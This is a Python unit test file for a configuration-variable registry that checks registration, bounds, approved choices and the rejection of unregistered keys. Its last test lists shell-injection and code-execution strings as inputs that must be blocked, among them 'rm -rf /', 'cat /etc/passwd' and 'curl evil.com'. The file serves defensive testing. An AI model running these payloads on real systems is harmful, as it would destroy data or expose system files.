"""Unit tests for Phase 38 Variable Registry and Security Validation."""

from __future__ import annotations

from aireliability.optimization.models import (
    ComponentCategory,
    OptimizationVariable,
    VariableDomain,
)
from aireliability.optimization.variables import (
    VariableRegistry,
    get_default_variable_registry,
)


def test_standard_variables_registered() -> None:
    """Verify standard variables are pre-registered and accessible."""
    reg = get_default_variable_registry()
    assert reg.has("temperature")
    assert reg.has("max_tokens")
    assert reg.has("top_k")
    assert reg.has("similarity_threshold")
    assert reg.has("prompt_version")
    assert reg.has("tool_timeout")
    assert reg.has("max_steps")
    assert reg.has("batch_size")
    assert reg.has("model_name")

    var = reg.get("temperature")
    assert var.domain == VariableDomain.FLOAT
    assert var.min_value == 0.0
    assert var.max_value == 2.0


def test_custom_variable_registration() -> None:
    """Test registering a custom domain variable."""
    reg = VariableRegistry(initial_variables=[])
    custom_var = OptimizationVariable(
        variable_id="custom_embedding_dim",
        name="Custom Embedding Dimension",
        component=ComponentCategory.RETRIEVAL,
        domain=VariableDomain.INT,
        min_value=64.0,
        max_value=1536.0,
        default_value=768,
    )
    reg.register(custom_var)
    assert reg.has("custom_embedding_dim")
    assert reg.get("custom_embedding_dim").default_value == 768


def test_validate_valid_configuration() -> None:
    """Test valid configuration passes validation."""
    reg = get_default_variable_registry()
    valid_cfg = {
        "temperature": 0.7,
        "max_tokens": 1024,
        "top_k": 5,
        "similarity_threshold": 0.8,
        "prompt_version": "v1.0",
    }
    is_valid, violations = reg.validate_configuration(valid_cfg)
    assert is_valid is True
    assert violations == []


def test_reject_unregistered_variable() -> None:
    """Test unregistered arbitrary configuration keys are strictly rejected."""
    reg = get_default_variable_registry()
    cfg_unregistered = {
        "temperature": 0.7,
        "arbitrary_admin_override": "true",
        "system_command": "ls",
    }
    is_valid, violations = reg.validate_configuration(cfg_unregistered)
    assert is_valid is False
    assert any("Forbidden or unregistered" in v for v in violations)


def test_reject_out_of_bounds_parameters() -> None:
    """Test parameters exceeding minimum or maximum domain bounds are flagged."""
    reg = get_default_variable_registry()
    cfg_out_of_bounds = {
        "temperature": 3.5,  # Max is 2.0
        "top_k": -5,  # Min is 1.0
    }
    is_valid, violations = reg.validate_configuration(cfg_out_of_bounds)
    assert is_valid is False
    assert any("exceeds maximum" in v for v in violations)
    assert any("below minimum" in v for v in violations)


def test_reject_invalid_choices() -> None:
    """Test choices not in approved catalog are rejected."""
    reg = get_default_variable_registry()
    cfg_bad_choice = {
        "prompt_version": "v999_unapproved",
    }
    is_valid, violations = reg.validate_configuration(cfg_bad_choice)
    assert is_valid is False
    assert any("not in approved choices" in v for v in violations)


def test_security_rejection_code_injection() -> None:
    """Test security patterns intercept shell injection or code execution attempts."""
    reg = get_default_variable_registry()
    malicious_inputs = [
        {"prompt_version": "v1.0; rm -rf /"},
        {"instruction_variant": "$(cat /etc/passwd)"},
        {"formatting_constraint": "`curl evil.com`"},
        {"prompt_version": "__import__('os').system('id')"},
        {"instruction_variant": "eval(something)"},
    ]

    for bad_cfg in malicious_inputs:
        is_valid, violations = reg.validate_configuration(bad_cfg)
        assert is_valid is False
        assert any(
            "Security violation" in v or "not in approved choices" in v
            for v in violations
        )
